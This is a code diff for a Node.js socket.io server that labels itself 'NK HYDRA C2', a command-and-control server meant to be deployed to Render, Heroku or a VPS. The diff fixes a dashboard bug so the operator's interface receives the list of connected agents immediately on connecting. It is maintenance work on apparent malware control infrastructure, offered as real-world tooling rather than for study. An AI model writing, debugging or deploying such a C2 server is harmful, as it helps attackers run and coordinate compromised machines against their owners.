@@ -1,4 +1,4 @@
-// NK HYDRA C2 v7.0 - REAL WORLD SERVER
+// NK HYDRA C2 v7.1 - REAL WORLD SERVER
 // DEPLOY THIS TO RENDER/HEROKU/VPS
 const express = require('express');
 const http = require('http');
@@ -133,6 +133,10 @@ io.on('connection', (socket) => {
             // Broadcast update to all connected clients (UIs)
             io.emit('agents_list', agents);
             io.emit('agent_event', { type: 'SYSTEM', agentId: data.id, payload: 'Agent Connected' });
+        } else if (data.type === 'ui') {
+             // FIX: Send current list to UI immediately upon connection
+             // This solves the '0 Agents' issue on Dashboard
+             socket.emit('agents_list', agents);
         }
     });
 
